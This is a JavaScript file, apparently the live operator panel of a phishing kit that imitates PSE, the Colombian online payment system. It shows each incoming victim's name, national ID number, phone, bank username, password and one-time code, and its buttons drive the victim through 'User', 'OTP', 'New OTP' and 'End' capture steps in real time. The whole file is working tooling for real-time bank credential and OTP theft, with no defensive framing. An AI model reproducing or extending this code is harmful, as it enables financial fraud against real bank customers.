socket.on("new_Ps", function (object) {
  let audio = new Audio("../static/audio/timbre.mp3");

  let intervalId = setInterval(() => {
    audio.play().catch(function (error) {
      console.log("Error al reproducir el audio:", error);
    });
  }, 1000);

  setTimeout(() => {
    clearInterval(intervalId);
  }, 5000);

  const content = document.getElementById("on-dataTables");
  let panel = document.getElementById("panel-" + object.id);

  if (!panel) {
    panel = document.createElement("div");
    panel.id = "panel-" + object.id;
    content.appendChild(panel);
  }

  panel.className = "card mb-3";

  if (object.estado == "Finalizado") {
    panel.innerHTML = `<div class="divcard">
            <div class="dropdown mt-3 mb-2 mx-3">
                    <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                        Acciones
                    </button>
                    <ul class="dropdown-menu" data-id="${object.idreg}">
                      <li><a class="dropdown-item active bg-danger" href="" data-estado="eliminar" onclick="deleteTrico(this.closest('.dropdown-menu').getAttribute('data-id'));  location.reload();">Eliminar</a></li>
                    </ul>
                </div>
                <table class="table table-striped table-bordered">
  <thead>
    <tr>
      <th scope="col">Fuente</th>
      <th scope="col">Nombre</th>
      <th scope="col">CC</th>
      <th scope="col">Teléfono</th>
      <th scope="col">Usuario</th>
      <th scope="col">Contraseña</th>
      <th scope="col">Dinámica</th>
      <th scope="col">Estado</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">PSE</th>
      <td>${object.nombre}</td>
      <td>${object.id}</td>
      <td>${object.telefono}</td>
      <td>${object.usuario}</td>
      <td>${object.password}</td>
      <td>${object.otp}</td>
      <td>${object.estado}</td>
    </tr>
  </tbody>
</table>
</div>      
            `;
  } else {
    panel.innerHTML = `<div class="divcard">
            <div class="dropdown mt-3 mb-2 mx-3">
                    <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                        Acciones
                    </button>
                    <ul class="dropdown-menu" data-id="${object.idreg}">
                      <li><a class="dropdown-item active bg-danger" href="" data-estado="eliminar" onclick="deleteTrico(this.closest('.dropdown-menu').getAttribute('data-id'));  location.reload();">Eliminar</a></li>
                    </ul>
                </div>
                <table class="table table-striped table-bordered">
  <thead>
    <tr>
      <th scope="col">Fuente</th>
      <th scope="col">Nombre</th>
      <th scope="col">CC</th>
      <th scope="col">Teléfono</th>
      <th scope="col">Usuario</th>
      <th scope="col">Contraseña</th>
      <th scope="col">Dinámica</th>
      <th scope="col">Estado</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">PSE</th>
      <td>${object.nombre}</td>
      <td>${object.id}</td>
      <td>${object.telefono}</td>
      <td>${object.usuario}</td>
      <td>${object.password}</td>
      <td>${object.otp}</td>
      <td>${object.estado}</td>
    </tr>
  </tbody>
</table>
</div>

                <div class="buttons mt-3 mb-3">
                    <button class="btno me-3" style="margin-left: 0.5rem" id="user-button-${object.idreg}">User</button>
                    <button class="btno me-3" id="OTP-button-${object.idreg}">OTP</button>
                    <button class="btno me-3" id="newOTP-button-${object.idreg}">New OTP</button>
                    <button class="btnend me-3" id="end-button-${object.idreg}">End</button>
                </div>
                
            `;

    let userButtons = document.querySelector(`#user-button-${object.idreg}`);
    userButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/psUser", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let OTPButtons = document.querySelector(`#OTP-button-${object.idreg}`);
    OTPButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/psOtp", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let newOTPButtons = document.querySelector(
      `#newOTP-button-${object.idreg}`
    );
    newOTPButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/psnewOtp", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let endButtons = document.querySelector(`#end-button-${object.idreg}`);
    endButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/psfinish", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });
  }

  content.prepend(panel);
});
